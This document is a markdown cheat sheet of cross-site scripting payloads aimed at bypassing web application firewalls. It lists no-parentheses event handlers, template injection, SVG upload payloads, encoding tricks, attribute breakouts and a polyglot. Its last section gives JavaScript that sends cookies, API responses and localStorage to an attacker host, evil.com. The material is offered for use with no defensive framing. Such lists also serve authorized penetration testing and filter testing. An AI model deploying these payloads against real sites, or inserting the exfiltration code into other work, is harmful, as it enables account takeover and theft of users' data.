# XSS Payloads — WAF Bypass Edition

## No-Parentheses (bypass WAFs filtering `()`)
```
<img src=x onerror=alert`1`>
<svg onload=alert`1`>
<body onload=alert`1`>
<details open ontoggle=alert`1`>
<marquee onstart=alert`1`>
<video src=x onerror=alert`1`>
<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d="M0 0"/><set attributeName=d to="alert(1)"/>
```

## Template Literal Injection
```
${alert(1)}
${{constructor.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
```

## SVG-Based (file upload bypass)
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

## DOM-Based via Fragment
```
#<img src=x onerror=alert(1)>
javascript:alert(1)//
data:text/html,<script>alert(1)</script>
```

## Encoding Bypasses
```
%3Csvg%20onload%3Dalert(1)%3E
&#x3C;svg onload=alert(1)&#x3E;
\u003csvg\u0020onload=alert(1)\u003e
<svg/onload=\u0061\u006C\u0065\u0072\u0074(1)>
```

## Event Handler (bypass tag filters)
```
" autofocus onfocus=alert(1) x="
' onfocus=alert(1) autofocus '
" onmouseover=alert(1) "
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
```

## Polyglot
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//!%DE%AD//</tiTle/</teleType/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## HttpOnly Cookie Steal (when XSS found but cookies HttpOnly)
```javascript
// Steal via fetch to attacker server
fetch('https://evil.com/steal?'+document.cookie)

// If HttpOnly, steal via CSRF token or API data instead
fetch('/api/me').then(r=>r.text()).then(d=>fetch('https://evil.com/exfil',{method:'POST',body:d}))

// Steal localStorage/sessionStorage
fetch('https://evil.com/steal?ls='+btoa(JSON.stringify(localStorage)))
```
